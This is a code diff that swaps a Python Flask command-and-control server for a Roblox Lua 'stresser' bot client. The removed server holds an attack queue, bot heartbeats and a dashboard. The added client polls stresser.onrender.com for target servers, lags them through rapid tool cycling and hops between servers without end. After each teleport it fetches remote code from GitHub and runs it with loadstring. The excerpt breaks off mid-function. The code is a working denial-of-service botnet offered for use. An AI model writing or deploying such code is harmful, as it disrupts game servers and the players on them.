@@ -1,991 +1,925 @@
-import os
-import sqlite3
-import threading
-from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, render_template_string
-from flask_cors import CORS
-import logging
+-- Advanced Stresser Bot Client v3.0
+-- Cloud-hosted automated bot with executor compatibility and duration tracking
 
-app = Flask(__name__)
-CORS(app)
+-- Check if script has already been executed using a global flag
+if _G.StresserBotExecuted then
+    warn("Stresser Bot is already running!")
+    return
+end
+_G.StresserBotExecuted = true
 
-# Configuration
-CONFIG = {
-    'TASK_EXPIRY_MINUTES': 10,
-    'MAX_BOTS_PER_TARGET': 50,
-    'DEBUG': True
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Configuration
+local CONFIG = {
+    API_URL = "https://stresser.onrender.com",
+    BOT_ID = "BOT_" .. string.upper(string.sub(game:GetService("RbxAnalyticsService"):GetClientId(), 1, 8)),
+    HEARTBEAT_INTERVAL = 5,  -- Combined heartbeat + task check every 5 seconds
+    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds
+    AUTO_START = true,
+    SCRIPT_URL = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/bot.lua",
+    TOOL_CYCLE_DELAY = 0.05  -- Very fast tool cycling for lag (NO TTS, NO TELEPORTING)
 }
 
-# SQLite setup with thread safety
-DB_PATH = os.path.join(os.path.dirname(__file__), 'bots.db')
-db_lock = threading.Lock()
+local player = Players.LocalPlayer
 
-def get_db_connection():
-    return sqlite3.connect(DB_PATH, check_same_thread=False)
+-- Setup queue teleport compatibility across executors
+local queueTeleport = (syn and syn.queue_on_teleport) or
+                     (fluxus and fluxus.queue_on_teleport) or
+                     queue_on_teleport or
+                     function() end
 
-def init_database():
-    with db_lock:
-        conn = get_db_connection()
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS attacks (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                targetPlace TEXT NOT NULL,
-                targetJob TEXT NOT NULL,
-                duration INTEGER DEFAULT 60,
-                status TEXT DEFAULT 'pending',
-                createdAt TEXT NOT NULL,
-                assignedAt TEXT,
-                completedAt TEXT,
-                assignedBot TEXT,
-                serverHop INTEGER DEFAULT 0,
-                serversLagged INTEGER DEFAULT 0
-            )
-        ''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS bots (
-                botId TEXT PRIMARY KEY,
-                lastPing TEXT NOT NULL,
-                status TEXT DEFAULT 'offline',
-                currentTarget TEXT,
-                currentPlace TEXT,
-                currentJob TEXT,
-                attacksExecuted INTEGER DEFAULT 0,
-                uptime INTEGER DEFAULT 0,
-                isOnline INTEGER DEFAULT 0
-            )
-        ''')
-        
-        # Create index for faster queries
-        cursor.execute('''
-            CREATE INDEX IF NOT EXISTS idx_attacks_status ON attacks(status)
-        ''')
-        
-        cursor.execute('''
-            CREATE INDEX IF NOT EXISTS idx_bots_online ON bots(isOnline, status)
-        ''')
-        
-        conn.commit()
-        conn.close()
+-- State
+local botState = {
+    isActive = false,
+    currentTarget = nil,
+    attacksExecuted = 0,
+    status = "STARTING",
+    startTime = tick(),
+    currentDuration = 0,
+    joinTime = 0,
+    shouldLeave = false,
+    isLagging = false,
+    lagEndTime = 0,
+    currentTaskId = nil,
+    serverHopEnabled = false,
+    teleportStartTime = 0,
+    teleportRetries = 0,
+    maxTeleportRetries = 3,
+    teleportTimeout = 30,
+    lastStatusSync = 0
+}
 
-# Initialize database
-init_database()
+-- File handling functions for executor compatibility
+local function fileExists(filename)
+    return pcall(function()
+        readfile(filename)
+    end)
+end
 
-# Logging setup
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
-
-# Helper functions
-def cleanup_expired_attacks():
-    expiry = (datetime.utcnow() - timedelta(minutes=CONFIG['TASK_EXPIRY_MINUTES'])).isoformat()
-    with db_lock:
-        conn = get_db_connection()
-        cursor = conn.cursor()
-        cursor.execute("DELETE FROM attacks WHERE status = 'pending' AND createdAt < ?", (expiry,))
-        deleted = cursor.rowcount
-        conn.commit()
-        conn.close()
-        if deleted > 0:
-            logger.info(f"Cleaned up {deleted} expired attacks")
-
-def cleanup_inactive_bots():
-    # Mark bots offline if no heartbeat for 1 minute (much faster detection)
-    expiry = (datetime.utcnow() - timedelta(minutes=1)).isoformat()
-    try:
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
-        cursor = conn.cursor()
-        
-        # Mark bots as offline first, then delete old records
-        cursor.execute("UPDATE bots SET isOnline = 0, status = 'offline' WHERE lastPing < ?", (expiry,))
-        updated = cursor.rowcount
-        
-        # Delete very old bot records (older than 30 minutes for faster cleanup)
-        old_expiry = (datetime.utcnow() - timedelta(minutes=30)).isoformat()
-        cursor.execute("DELETE FROM bots WHERE lastPing < ?", (old_expiry,))
-        deleted = cursor.rowcount
-        
-        conn.commit()
-        conn.close()
-        if updated > 0:
-            logger.info(f"Marked {updated} bots as offline")
-        if deleted > 0:
-            logger.info(f"Cleaned up {deleted} old bot records")
-    except Exception as e:
-        logger.error(f"Database error in cleanup_inactive_bots: {str(e)}")
-        if 'conn' in locals():
-            conn.close()
-
-def get_bot_status(bot_id):
-    """Get current bot status from database"""
-    try:
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 500')
-        cursor = conn.cursor()
-        cursor.execute('SELECT status FROM bots WHERE botId = ?', (bot_id,))
-        result = cursor.fetchone()
-        conn.close()
-        return {'status': result[0]} if result else None
-    except Exception as e:
-        logger.error(f"Error getting bot status: {str(e)}")
-        return None
-
-def update_bot_status(bot_id, status, current_place="", current_job="", attacks_executed=0, uptime=0):
-    now = datetime.utcnow().isoformat()
-    is_online = 1 if status in ['online', 'attacking', 'in_server', 'lagging', 'teleporting', 'completed'] else 0
+local function createBotFolder()
+    local folderName = "StresserBot"
+    local statusFile = folderName .. "/status.txt"
     
-    # Use a shorter timeout to prevent deadlocks
-    try:
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT OR REPLACE INTO bots (
-                botId, lastPing, status, currentPlace, currentJob, 
-                attacksExecuted, uptime, isOnline
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (bot_id, now, status, current_place, current_job, attacks_executed, uptime, is_online))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"Database error in update_bot_status: {str(e)}")
-        if 'conn' in locals():
-            conn.close()
+    pcall(function()
+        if not fileExists(folderName) then
+            makefolder(folderName)
+        end
+        if not fileExists(statusFile) then
+            writefile(statusFile, "")
+        end
+    end)
+    return statusFile
+end
 
-# API Endpoints
+local function saveBotStatus(status)
+    pcall(function()
+        local statusFile = createBotFolder()
+        writefile(statusFile, HttpService:JSONEncode({
+            botId = CONFIG.BOT_ID,
+            status = status,
+            lastUpdate = tick(),
+            attacksExecuted = botState.attacksExecuted
+        }))
+    end)
+end
 
-@app.route('/bot.lua')
-def serve_bot_script():
-    """Serve the bot script for re-execution after teleport"""
-    try:
-        with open('bot.lua', 'r') as f:
-            script_content = f.read()
-        return script_content, 200, {'Content-Type': 'text/plain'}
-    except FileNotFoundError:
-        return "-- Bot script not found", 404
+-- Console GUI for monitoring
+local function createConsole()
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "StresserBotConsole"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+    
+    -- Console Frame
+    local consoleFrame = Instance.new("Frame")
+    consoleFrame.Size = UDim2.new(0, 400, 0, 250)
+    consoleFrame.Position = UDim2.new(0, 10, 0, 10)
+    consoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    consoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+    consoleFrame.BorderSizePixel = 2
+    consoleFrame.Active = true
+    consoleFrame.Draggable = true
+    consoleFrame.Parent = screenGui
+    
+    -- Console Header
+    local header = Instance.new("TextLabel")
+    header.Size = UDim2.new(1, 0, 0, 30)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+    header.BorderSizePixel = 0
+    header.Text = "STRESSER BOT | ID: " .. CONFIG.BOT_ID
+    header.TextColor3 = Color3.new(0, 0, 0)
+    header.TextScaled = true
+    header.Font = Enum.Font.GothamBold
+    header.Parent = consoleFrame
+    
+    -- Status Bar
+    local statusBar = Instance.new("TextLabel")
+    statusBar.Size = UDim2.new(1, 0, 0, 25)
+    statusBar.Position = UDim2.new(0, 0, 0, 30)
+    statusBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    statusBar.BorderSizePixel = 0
+    statusBar.Text = "STATUS: STARTING"
+    statusBar.TextColor3 = Color3.fromRGB(255, 255, 0)
+    statusBar.TextScaled = true
+    statusBar.Font = Enum.Font.Code
+    statusBar.Parent = consoleFrame
+    
+    -- Console Text
+    local consoleText = Instance.new("TextLabel")
+    consoleText.Size = UDim2.new(1, -10, 1, -65)
+    consoleText.Position = UDim2.new(0, 5, 0, 60)
+    consoleText.BackgroundTransparency = 1
+    consoleText.Text = ""
+    consoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    consoleText.TextScaled = false
+    consoleText.TextSize = 12
+    consoleText.Font = Enum.Font.Code
+    consoleText.TextYAlignment = Enum.TextYAlignment.Top
+    consoleText.TextXAlignment = Enum.TextXAlignment.Left
+    consoleText.Parent = consoleFrame
+    
+    return {
+        screenGui = screenGui,
+        consoleText = consoleText,
+        statusBar = statusBar,
+        header = header
+    }
+end
 
-@app.route('/')
-def dashboard():
-    """Stresser control dashboard"""
-    html = '''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Stresser Control Panel</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-            
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            
-            body { 
-                font-family: 'Inter', sans-serif; 
-                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
-                color: #ffffff;
-                min-height: 100vh;
-                overflow-x: hidden;
-            }
-            
-            .container { 
-                max-width: 1400px; 
-                margin: 0 auto; 
-                padding: 2rem;
-                position: relative;
-            }
-            
-            .header { 
-                text-align: center; 
-                margin-bottom: 3rem;
-                position: relative;
-            }
-            
-            .header::before {
-                content: '';
-                position: absolute;
-                top: -50px;
-                left: 50%;
-                transform: translateX(-50%);
-                width: 100px;
-                height: 100px;
-                background: linear-gradient(45deg, #ff0066, #ff6600);
-                border-radius: 50%;
-                opacity: 0.1;
-                animation: pulse 2s infinite;
-            }
-            
-            @keyframes pulse {
-                0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.1; }
-                50% { transform: translateX(-50%) scale(1.2); opacity: 0.2; }
-            }
-            
-            .header h1 { 
-                font-size: 3.5rem;
-                font-weight: 700;
-                background: linear-gradient(135deg, #ff0066, #ff6600, #ffcc00);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                background-clip: text;
-                margin-bottom: 0.5rem;
-                text-shadow: 0 0 30px rgba(255, 0, 102, 0.3);
-            }
-            
-            .subtitle {
-                font-size: 1.2rem;
-                color: #888;
-                font-weight: 300;
-                margin-bottom: 1rem;
-            }
-            
-            .status-indicator {
-                display: inline-flex;
-                align-items: center;
-                gap: 8px;
-                background: rgba(0, 255, 0, 0.1);
-                border: 1px solid rgba(0, 255, 0, 0.3);
-                padding: 8px 16px;
-                border-radius: 25px;
-                font-size: 0.9rem;
-            }
-            
-            .status-dot {
-                width: 8px;
-                height: 8px;
-                border-radius: 50%;
-                background: #00ff00;
-                animation: blink 1.5s infinite;
-            }
-            
-            @keyframes blink {
-                0%, 50% { opacity: 1; }
-                51%, 100% { opacity: 0.3; }
-            }
-            
-            .stats { 
-                display: grid; 
-                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
-                gap: 2rem; 
-                margin-bottom: 3rem; 
-            }
-            
-            .stat { 
-                background: rgba(255, 255, 255, 0.03);
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.1);
-                padding: 2rem;
-                text-align: center;
-                border-radius: 20px;
-                transition: all 0.3s ease;
-                position: relative;
-                overflow: hidden;
-            }
-            
-            .stat::before {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-                transition: left 0.5s;
-            }
-            
-            .stat:hover::before {
-                left: 100%;
-            }
-            
-            .stat:hover { 
-                transform: translateY(-5px);
-                border-color: rgba(255, 102, 0, 0.5);
-                box-shadow: 0 20px 40px rgba(255, 102, 0, 0.1);
-            }
-            
-            .stat h3 { 
-                margin-bottom: 1rem;
-                color: #ff6600;
-                font-size: 0.9rem;
-                font-weight: 600;
-                text-transform: uppercase;
-                letter-spacing: 1px;
-            }
-            
-            .stat p { 
-                font-size: 3rem;
-                font-weight: 700;
-                color: #ffffff;
-                margin-bottom: 0.5rem;
-            }
-            
-            .stat-trend {
-                font-size: 0.8rem;
-                color: #888;
-            }
-            
-            .info-section {
-                background: rgba(255, 255, 255, 0.03);
-                backdrop-filter: blur(10px);
-                border: 1px solid rgba(255, 255, 255, 0.1);
-                padding: 2rem;
-                border-radius: 20px;
-                margin-bottom: 2rem;
-            }
-            
-            .info-section h3 { 
-                color: #00ffff; 
-                margin-bottom: 1.5rem;
-                font-size: 1.5rem;
-                font-weight: 600;
-            }
-            
-            .endpoint-list {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-                gap: 1rem;
-            }
-            
-            .endpoint {
-                background: rgba(0, 0, 0, 0.3);
-                padding: 1rem;
-                border-radius: 10px;
-                border-left: 4px solid #00ffff;
-                transition: all 0.3s ease;
-            }
-            
-            .endpoint:hover {
-                background: rgba(0, 255, 255, 0.1);
-                transform: translateX(5px);
-            }
-            
-            .endpoint-method {
-                font-weight: 600;
-                color: #ff6600;
-                margin-right: 1rem;
-            }
-            
-            .endpoint-path {
-                color: #00ffff;
-                font-family: 'Courier New', monospace;
-            }
-            
-            .endpoint-desc {
-                color: #aaa;
-                font-size: 0.9rem;
-                margin-top: 0.5rem;
-            }
-            
-            .footer {
-                text-align: center;
-                margin-top: 3rem;
-                padding: 2rem;
-                border-top: 1px solid rgba(255, 255, 255, 0.1);
-            }
-            
-            .footer p {
-                color: #666;
-                font-size: 0.9rem;
-            }
-            
-            @media (max-width: 768px) {
-                .container { padding: 1rem; }
-                .header h1 { font-size: 2.5rem; }
-                .stats { grid-template-columns: 1fr; gap: 1rem; }
-                .stat p { font-size: 2rem; }
-            }
-        </style>
-        <script>
-            async function fetchStats() {
-                try {
-                    const response = await fetch('/api/stats');
-                    const data = await response.json();
-                    document.getElementById('pending-attacks').textContent = data.pending_attacks;
-                    document.getElementById('active-attacks').textContent = data.active_attacks;
-                    document.getElementById('online-bots').textContent = data.online_bots;
-                    document.getElementById('completed-attacks').textContent = data.completed_attacks;
-                } catch (error) {
-                    console.error('Error:', error);
-                }
-            }
-            
-            async function clearAttacks() {
-                if (confirm('Clear all pending attacks?')) {
-                    await fetch('/api/clear-attacks', { method: 'POST' });
-                    fetchStats();
-                }
-            }
-            
-            setInterval(fetchStats, 5000); // Reduced frequency to prevent server overload
-            window.onload = fetchStats;
-        </script>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>STRESSER CONTROL</h1>
-                <p class="subtitle">Advanced Bot Management System</p>
-                <div class="status-indicator">
-                    <div class="status-dot"></div>
-                    System Online
-                </div>
-            </div>
-            
-            <div class="stats">
-                <div class="stat">
-                    <h3>Pending Attacks</h3>
-                    <p id="pending-attacks">-</p>
-                    <div class="stat-trend">Queued Tasks</div>
-                </div>
-                <div class="stat">
-                    <h3>Active Attacks</h3>
-                    <p id="active-attacks">-</p>
-                    <div class="stat-trend">Currently Running</div>
-                </div>
-                <div class="stat">
-                    <h3>Online Bots</h3>
-                    <p id="online-bots">-</p>
-                    <div class="stat-trend">Ready for Action</div>
-                </div>
-                <div class="stat">
-                    <h3>Completed</h3>
-                    <p id="completed-attacks">-</p>
-                    <div class="stat-trend">Total Finished</div>
-                </div>
-            </div>
-            
-            <div class="info-section">
-                <h3>System Information</h3>
-                <div class="endpoint-list">
-                    <div class="endpoint">
-                        <span class="endpoint-method">GET</span>
-                        <span class="endpoint-path">/health</span>
-                        <div class="endpoint-desc">API health and status check</div>
-                    </div>
-                    <div class="endpoint">
-                        <span class="endpoint-method">GET</span>
-                        <span class="endpoint-path">/</span>
-                        <div class="endpoint-desc">Control dashboard</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="footer">
-                <p>Advanced Stresser Bot System v3.0 | Built for Performance</p>
-            </div>
-        </div>
-    </body>
-</html>
-    '''
-    return html
+-- Console logging
+local console
+local consoleLines = {}
+local maxLines = 15
 
-@app.route('/queue-task', methods=['POST'])
-def launch_attack():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'error': 'No attack data provided'}), 400
-            
-        target_place = str(data.get('placeId', ''))
-        target_job = str(data.get('jobId', ''))
-        duration = int(data.get('duration', 60))
-        server_hop = bool(data.get('serverHop', False))
+local function log(message, logType)
+    logType = logType or "INFO"
+    local timestamp = os.date("%H:%M:%S")
+    local logLine = "[" .. timestamp .. "] [" .. logType .. "] " .. message
+    
+    print(logLine)
+    
+    if console then
+        table.insert(consoleLines, logLine)
+        if #consoleLines > maxLines then
+            table.remove(consoleLines, 1)
+        end
         
-        if not target_place or not target_job:
-            return jsonify({'error': 'Missing target information'}), 400
-        
-        cleanup_expired_attacks()
-        
-        with db_lock:
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            now = datetime.utcnow().isoformat()
-            
-            cursor.execute('''
-                INSERT INTO attacks (targetPlace, targetJob, duration, status, createdAt, serverHop)
-                VALUES (?, ?, ?, ?, ?, ?)
-            ''', (target_place, target_job, duration, 'pending', now, int(server_hop)))
-            
-            attack_id = cursor.lastrowid
-            conn.commit()
-            conn.close()
-        
-        logger.info(f"Attack launched: {attack_id} -> {target_place} for {duration}s")
-        
-        return jsonify({
-            'success': True,
-            'taskId': attack_id,
-            'message': 'Attack launched successfully',
-            'target': target_place,
-            'duration': duration
-        })
-        
-    except Exception as e:
-        logger.error(f"Error launching attack: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+        console.consoleText.Text = table.concat(consoleLines, "\n")
+    end
+end
 
-@app.route('/get-task', methods=['GET'])
-def get_target():
-    try:
-        bot_id = request.args.get('botId')
-        if not bot_id:
-            return jsonify({'error': 'Bot ID required'}), 400
+-- API functions
+local function makeRequest(endpoint, method, data)
+    local success, response = pcall(function()
+        local requestData = {
+            Url = CONFIG.API_URL .. endpoint,
+            Method = method or "GET"
+        }
         
-        cleanup_expired_attacks()
-        cleanup_inactive_bots()
+        if data then
+            requestData.Headers = {["Content-Type"] = "application/json"}
+            requestData.Body = HttpService:JSONEncode(data)
+        end
         
-        # Remove db_lock to prevent deadlocks
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
-        cursor = conn.cursor()
-        
-        # Check if bot already has an assigned task
-        cursor.execute('''
-            SELECT * FROM attacks 
-            WHERE assignedBot = ? AND status = 'assigned'
-        ''', (bot_id,))
-        existing_task = cursor.fetchone()
-        
-        if existing_task:
-            conn.close()
-            return jsonify({
-                'task': {
-                    'taskId': existing_task[0],
-                    'type': 'join_game',
-                    'placeId': existing_task[1],
-                    'jobId': existing_task[2],
-                    'duration': existing_task[3],
-                    'serverHop': bool(existing_task[9]) if len(existing_task) > 9 else False
-                }
-            })
-        
-        # Get next pending attack
-        cursor.execute('''
-            SELECT * FROM attacks 
-            WHERE status = 'pending' 
-            ORDER BY createdAt ASC 
-            LIMIT 1
-        ''')
-        attack = cursor.fetchone()
-        
-        if attack:
-            attack_id = attack[0]
-            now = datetime.utcnow().isoformat()
-            
-            # Mark attack as assigned to this bot
-            cursor.execute('''
-                UPDATE attacks SET status = 'assigned', assignedAt = ?, assignedBot = ?
-                WHERE id = ?
-            ''', (now, bot_id, attack_id))
-            
-            conn.commit()
-            conn.close()
-            
-            # Update bot status
-            update_bot_status(bot_id, 'attacking', attack[1], attack[2])
-            
-            logger.info(f"Attack {attack_id} assigned to bot {bot_id} - Target: {attack[1]} Duration: {attack[3]}s")
-            
-            return jsonify({
-                'task': {
-                    'taskId': attack_id,
-                    'type': 'join_game',
-                    'placeId': attack[1],
-                    'jobId': attack[2],
-                    'duration': attack[3],
-                    'serverHop': bool(attack[9]) if len(attack) > 9 else False
-                }
-            })
-        else:
-            conn.close()
-            # Update bot status to online (idle) only if not currently lagging
-            current_bot = get_bot_status(bot_id)
-            if current_bot and current_bot.get('status') not in ['lagging', 'attacking', 'teleporting']:
-                update_bot_status(bot_id, 'online')
-            return jsonify({'task': None})
-        
-    except Exception as e:
-        logger.error(f"Error getting target: {str(e)}")
-        if 'conn' in locals():
-            conn.close()
-        return jsonify({'error': 'Internal server error'}), 500
+        return request(requestData)
+    end)
+    
+    return success, response
+end
 
-@app.route('/bot-heartbeat', methods=['POST'])
-def bot_ping():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
+local function syncWithAPI()
+    if not botState.isActive then return nil end
+    
+    local syncData = {
+        botId = CONFIG.BOT_ID,
+        status = botState.status,
+        currentPlace = tostring(game.PlaceId),
+        currentJob = game.JobId,
+        attacksExecuted = botState.attacksExecuted,
+        uptime = math.floor(tick() - botState.startTime)
+    }
+    
+    local success, response = makeRequest("/bot-sync", "POST", syncData)
+    
+    if success and response.Success then
+        local data = HttpService:JSONDecode(response.Body)
+        log("API sync successful - Status: " .. botState.status)
+        saveBotStatus(botState.status)
+        
+        -- Check if our current attack was stopped by the API
+        if (botState.status == "TELEPORTING" or botState.status == "teleporting" or botState.status == "attacking") and 
+           botState.currentTaskId then
+            -- Check if our task still exists and is assigned
+            local taskSuccess, taskResponse = makeRequest("/get-task?botId=" .. CONFIG.BOT_ID, "GET")
+            if taskSuccess and taskResponse.Success then
+                local taskData = HttpService:JSONDecode(taskResponse.Body)
+                -- If no task is returned or task ID doesn't match, our attack was stopped
+                if not taskData.task or taskData.task.taskId ~= botState.currentTaskId then
+                    log("Attack was stopped by API - resetting bot status", "SYSTEM")
+                    botState.status = "online"
+                    botState.currentTarget = nil
+                    botState.currentTaskId = nil
+                    botState.teleportRetries = 0
+                    botState.teleportStartTime = 0
+                    botState.isLagging = false
+                    botState.lagEndTime = 0
+                    saveBotStatus("online")
+                    return nil
+                end
+            end
+        end
+        
+        -- Return task if one was assigned
+        if data.task then
+            log("New target assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s | Server Hop: " .. tostring(data.task.serverHop or false))
+            return data.task
+        end
+        
+        return nil
+    else
+        log("API sync failed", "ERROR")
+        return nil
+    end
+end
+
+-- Server hop completion function
+local function completeServerHop()
+    if not botState.currentTaskId then
+        log("No task ID available for server hop completion", "ERROR")
+        return false
+    end
+    
+    local hopData = {
+        botId = CONFIG.BOT_ID,
+        taskId = botState.currentTaskId
+    }
+    
+    log("Completing server hop for task: " .. botState.currentTaskId, "ATTACK")
+    
+    local success, response = makeRequest("/server-hop-complete", "POST", hopData)
+    
+    if success and response.Success then
+        local data = HttpService:JSONDecode(response.Body)
+        if data.success then
+            log("Server hop completed! Servers lagged: " .. (data.serversLagged or 0), "ATTACK")
             
-        bot_id = data.get('botId', 'unknown')
-        status = data.get('status', 'offline')
-        current_place = data.get('currentPlace')
-        current_job = data.get('currentJob')
-        attacks_executed = data.get('attacksExecuted', 0)
-        uptime = data.get('uptime', 0)
-        
-        update_bot_status(bot_id, status, current_place, current_job, attacks_executed, uptime)
-        
-        # If bot completed an attack, mark it as completed
-        if status == 'completed':
-            try:
-                conn = get_db_connection()
-                conn.execute('PRAGMA busy_timeout = 1000')  # 1 second timeout
-                cursor = conn.cursor()
-                now = datetime.utcnow().isoformat()
+            if data.newTask then
+                log("Got new server hop task: " .. data.newTask.placeId, "ATTACK")
+                -- Store the new task info
+                botState.currentTarget = data.newTask
+                botState.currentDuration = data.newTask.duration or 60
+                botState.currentTaskId = data.newTask.taskId
+                botState.serverHopEnabled = data.newTask.serverHop or false
                 
-                # First check if there's an assigned attack for this bot
-                cursor.execute('SELECT id FROM attacks WHERE assignedBot = ? AND status = ?', (bot_id, 'assigned'))
-                attack = cursor.fetchone()
+                -- Reset teleport counters for server hop
+                botState.teleportRetries = 0
+                botState.teleportStartTime = 0
                 
-                if attack:
-                    cursor.execute('''
-                        UPDATE attacks SET status = 'completed', completedAt = ? 
-                        WHERE assignedBot = ? AND status = 'assigned'
-                    ''', (now, bot_id))
-                    updated = cursor.rowcount
-                    conn.commit()
-                    logger.info(f"Bot {bot_id} completed attack - Updated {updated} attack records")
-                else:
-                    logger.warning(f"Bot {bot_id} sent completed status but no assigned attack found")
-                
-                conn.close()
-            except Exception as e:
-                logger.error(f"Error marking attack completed: {str(e)}")
-                if 'conn' in locals():
-                    conn.close()
-        
-        return jsonify({'success': True, 'message': 'Heartbeat received'})
-        
-    except Exception as e:
-        logger.error(f"Error processing bot heartbeat: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+                -- Teleport to new server for infinite hopping
+                wait(2)
+                log("Starting server hop teleport to place: " .. data.newTask.placeId, "ATTACK")
+                teleportToRandomServer(data.newTask.placeId)
+                return true
+            else
+                log("Server hop complete, no new task - going idle", "ATTACK")
+                botState.status = "online"
+                botState.currentTarget = nil
+                botState.currentTaskId = nil
+                botState.serverHopEnabled = false
+                return true
+            end
+        else
+            log("Server hop completion failed: " .. (data.error or "Unknown error"), "ERROR")
+            return false
+        end
+    else
+        log("Server hop API request failed", "ERROR")
+        return false
+    end
+end
 
-@app.route('/server-hop-complete', methods=['POST'])
-def server_hop_complete():
-    """Handle server hop completion - increment servers lagged count and create new task if infinite hopping"""
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
-            
-        bot_id = data.get('botId', 'unknown')
-        task_id = data.get('taskId')
-        
-        if not task_id:
-            return jsonify({'error': 'Task ID required'}), 400
-        
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 1000')
-        cursor = conn.cursor()
-        
-        # Get the current attack details
-        cursor.execute('SELECT * FROM attacks WHERE id = ?', (task_id,))
-        attack = cursor.fetchone()
-        
-        if not attack:
-            conn.close()
-            return jsonify({'error': 'Attack not found'}), 404
-        
-        # Increment servers lagged count
-        current_servers_lagged = attack[10] if len(attack) > 10 else 0
-        new_servers_lagged = current_servers_lagged + 1
-        
-        # Update the attack record
-        cursor.execute('''
-            UPDATE attacks SET serversLagged = ? WHERE id = ?
-        ''', (new_servers_lagged, task_id))
-        
-        is_server_hop = bool(attack[9]) if len(attack) > 9 else False
-        
-        # If server hopping is enabled, create a new task for infinite hopping
-        if is_server_hop:
-            # Mark current attack as completed
-            now = datetime.utcnow().isoformat()
-            cursor.execute('''
-                UPDATE attacks SET status = 'completed', completedAt = ? WHERE id = ?
-            ''', (now, task_id))
-            
-            # Create new attack for server hopping (with random jobId to force random server)
-            cursor.execute('''
-                INSERT INTO attacks (targetPlace, targetJob, duration, status, createdAt, serverHop, assignedBot, assignedAt)
-                VALUES (?, ?, ?, 'assigned', ?, ?, ?, ?)
-            ''', (attack[1], 'random', attack[3], now, 1, bot_id, now))
-            
-            new_task_id = cursor.lastrowid
-            conn.commit()
-            conn.close()
-            
-            logger.info(f"Server hop completed for bot {bot_id} - Servers lagged: {new_servers_lagged} - Created new task: {new_task_id}")
-            
-            return jsonify({
-                'success': True,
-                'serversLagged': new_servers_lagged,
-                'newTask': {
-                    'taskId': new_task_id,
-                    'type': 'join_game',
-                    'placeId': attack[1],
-                    'jobId': 'random',
-                    'duration': attack[3],
-                    'serverHop': True
-                }
-            })
-        else:
-            # Just mark as completed for normal attacks
-            now = datetime.utcnow().isoformat()
-            cursor.execute('''
-                UPDATE attacks SET status = 'completed', completedAt = ? WHERE id = ?
-            ''', (now, task_id))
-            
-            conn.commit()
-            conn.close()
-            
-            logger.info(f"Attack completed for bot {bot_id} - Servers lagged: {new_servers_lagged}")
-            
-            return jsonify({
-                'success': True,
-                'serversLagged': new_servers_lagged,
-                'newTask': None
-            })
-        
-    except Exception as e:
-        logger.error(f"Error processing server hop complete: {str(e)}")
-        if 'conn' in locals():
-            conn.close()
-        return jsonify({'error': 'Internal server error'}), 500
+local function teleportToRandomServer(placeId)
+    log("Teleporting to random server for place: " .. placeId .. " (Attempt " .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
+    botState.status = "teleporting"
+    botState.teleportStartTime = tick()
+    botState.teleportRetries = botState.teleportRetries + 1
+    
+    -- Queue the script to re-execute after teleport
+    queueTeleport([[
+        -- Re-execute the stresser bot script
+        _G.StresserBotExecuted = nil
+        wait(3)
+        local success, script = pcall(function()
+            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
+        end)
+        if success and script and script ~= "" then
+            local loadSuccess, err = pcall(function()
+                loadstring(script)()
+            end)
+            if not loadSuccess then
+                warn("Script execution failed: " .. tostring(err))
+            end
+        else
+            warn("Failed to download bot script for re-execution")
+        end
+    ]])
+    
+    -- Teleport to a random server of the same place
+    local success, result = pcall(function()
